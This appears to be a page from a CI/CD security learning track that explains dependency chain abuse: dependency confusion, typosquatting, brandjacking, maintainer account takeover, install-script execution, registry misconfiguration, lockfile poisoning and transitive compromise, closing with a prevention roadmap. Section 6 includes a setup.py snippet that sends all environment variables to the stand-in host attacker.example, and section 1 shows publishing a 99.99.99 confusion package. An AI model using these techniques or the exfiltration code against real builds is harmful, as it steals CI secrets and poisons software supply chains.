# CICD-SEC-3: Dependency Chain Abuse - Attack Vectors

## Table of Contents
- [Understanding Dependency Chain Attack Vectors](#understanding-dependency-chain-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining the Abuse](#chaining-the-abuse)

## Understanding Dependency Chain Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are described so you can find and fix these weaknesses in build systems you own or are authorised to test. Publishing malicious packages or targeting names you do not control is illegal.

Dependency Chain Abuse is not exploited by breaking into your network. The attacker never touches your infrastructure directly—they publish or poison a package on a registry your build already trusts, then wait for your pipeline to fetch it. The entire attack happens through the **normal, automated dependency-resolution process**, which is exactly why it is so hard to notice.

The attacker's goal is one of:

- Get a build to resolve a **malicious artifact** in place of the intended one (confusion, typosquat, brandjack).
- Poison an **already-trusted** package the build depends on (hijack, transitive).
- Turn a fetched package into **code execution** on the build agent via install-time scripts.

### Core Attack Flow

```
1. Discover
   |
   Harvest internal package names, versions, and registry config
   from public commits, error logs, bundles, job posts
2. Position
   |
   Publish a malicious public package (same/typo/brand name) OR
   hijack an existing maintainer account / abandoned package
3. Win resolution
   |
   Higher version, public fallback, or the poisoned update is pulled
4. Execute
   |
   postinstall / setup.py runs on the build agent as the CI user
5. Escalate / Exfiltrate
   |
   Steal secrets, poison the artifact, pivot into internal systems
```

## Common Attack Patterns

### 1. Dependency Confusion via Public Fallback

The build resolves an unscoped internal name and the resolver can reach the public registry, which returns a higher-versioned malicious copy.

```bash
# Internal name used in the manifest (no scope):
#   "acme-billing-client": "^1.2.0"
#
# Attacker publishes to the PUBLIC registry:
npm publish            # name: acme-billing-client, version: 99.99.99

# Build runs with public fallback enabled:
npm install
#   internal registry has 1.2.4
#   public  registry has 99.99.99  <- higher version wins
#   -> malicious 99.99.99 is fetched and its postinstall runs
```

**Payoff**: code execution with no typo and no social engineering—the version-selection rule does the work. The same class applies to pip (`--extra-index-url` merging indexes), Maven (public repo before private), and others.

### 2. Typosquatting a Popular Name

The attacker registers names one edit away from heavily-used packages and waits for a mistyped manifest or copy-paste error.

```bash
# Legit vs. squat (illustrative shapes):
requests   -> reqeusts / request-lib / python-requests-
lodash     -> loadsh / lodahs / lodash-js
express    -> expres / express-js-

# In a manifest a single wrong character resolves to the squat:
pip install reqeusts      # setup.py runs attacker code on install
```

**Payoff**: the malicious package installs and runs before anyone notices the name is *almost* right. Auto-generated or AI-suggested manifests amplify this.

### 3. Brandjacking a Trusted Namespace

Rather than a typo, the name borrows a brand's authority so it looks official.

```bash
# Names crafted to look vendor-blessed:
acme-official-sdk        node-acme-payments
acme-cloud-cli           @acme-partners/connector   # look-alike scope

# A developer trusts the brand and installs it:
npm install acme-official-sdk
```

**Payoff**: the victim believes they installed a first-party package. Brandjacking often pairs with a convincing README and inflated download counts.

### 4. Maintainer Account Takeover

The attacker seizes an existing, trusted package and ships a malicious version to everyone who upgrades.

```
# Common takeover paths:
- Reused/leaked maintainer password, no MFA on the registry account
- Expired domain behind the maintainer's email -> password reset
- Registry API/publish token leaked in a public repo or CI log

# Result: a real package you already depend on gets a poisoned release:
good-logger  4.7.2  (clean)  ->  4.7.3  (malicious, same trusted name)
```

**Payoff**: the poisoned version is already in the ecosystem's lockfiles and pulls in on the next upgrade—no new name to detect.

### 5. Abandoned / Expired Package Reuse

A deleted or de-published name, or one whose maintainer vanished, is re-registered by an attacker who then serves malware under the trusted-looking name.

```
# A dependency references a name that was unpublished/abandoned:
#   "tiny-helper": "^0.3.0"
# Attacker re-registers "tiny-helper" on the public registry
# -> builds that still reference it now fetch attacker code
```

**Payoff**: trust attached to the old name is inherited by the new, malicious owner.

### 6. Install-Time Script Execution

Once any malicious package is resolved, lifecycle scripts run automatically—this is the actual code-execution step for most of the classes above.

```js
// package.json in the malicious package
{ "scripts": { "postinstall": "node ./collect.js" } }
```

```python
# Python equivalent — arbitrary code in setup.py at install time
# setup.py
import os, urllib.request, json
urllib.request.urlopen("https://attacker.example/x",
    data=json.dumps(dict(os.environ)).encode())   # secrets leave the agent
```

**Payoff**: RCE on the build agent as the CI user—before your code runs and whether or not you import the package.

### 7. Misconfigured Registry Resolution

Configuration that consults public before private, merges indexes, or lacks scope pinning turns a benign manifest into a confusion target.

```ini
# .npmrc that leaves a private scope open to public fallback:
registry=https://registry.npmjs.org/          # public is the default
# (no scope->registry mapping for @acme, so @acme can resolve publicly)
```

```bash
# pip merging a private index WITH PyPI — highest version across both wins:
pip install -r requirements.txt \
    --index-url https://pypi.org/simple \
    --extra-index-url https://pypi.internal/acme/simple
```

**Payoff**: the resolver, not the attacker, chooses the malicious copy—because the config told it public was fair game.

### 8. Lockfile and Cache Poisoning

A single bad resolution is captured into a lockfile or a shared build cache and then trusted by every later build.

```
# A confusion win during one loose install writes the malicious
# version + resolved URL into the lockfile:
#   "acme-billing-client": { "version": "99.99.99",
#      "resolved": "https://registry.npmjs.org/..." }
# Every subsequent `npm ci` now faithfully re-installs the malicious pin.
```

**Payoff**: persistence—the poisoning survives long after the attacker's package is removed from the registry.

### 9. Transitive Graph Poisoning

The attacker compromises a deep, indirect dependency; it rides upward into your build even though you never named it.

```
your-app
+- ui-widgets        (you chose this)
   +- color-parse    (you did not)
      +- str-utils    (compromised — attacker code lives here)
```

**Payoff**: depth is camouflage—nobody audits `str-utils`, yet its install script runs in your pipeline.

## Chaining the Abuse

Real intrusions stitch these steps together:

```
Leaked internal name in a public commit   -> pick a confusion target
        +
Public fallback enabled in .npmrc         -> malicious 99.99.99 wins
        +
postinstall runs on the build agent       -> steal CI + cloud tokens
        =  build-agent compromise and secret theft, no infra break-in
```

Another common chain:

```
Maintainer account takeover (no MFA)      -> poison a trusted transitive dep
        -> poisoned version pulled on next upgrade
        -> artifact is built, signed, and shipped by your own pipeline
        -> every downstream consumer receives the malware
```

## Key Takeaways

1. **The attacker uses your own resolver**—they publish or poison, and the build fetches; no direct intrusion is needed.
2. **Names are the weapon**—confusion, typosquats, and brandjacks all abuse trust in a human-friendly name.
3. **Installing is executing**—lifecycle scripts turn a fetched package into RCE on the build agent.
4. **Trusted packages get poisoned too**—account takeover and transitive compromise bypass "reputable-only" rules.
5. **Bad resolutions persist**—lockfiles and caches faithfully re-install a poisoned pin long after takedown.

## Next Steps

- **[Prevention Guide](prevention.md)**: Control resolution so these vectors cannot win
- **[Code Examples](examples.md)**: Insecure vs. secure package-manager configuration
- **[CI/CD Security Track](/learn/cicd)**: Continue the OWASP CI/CD Top 10
- **[Practice](/practice)**: Apply these controls hands-on
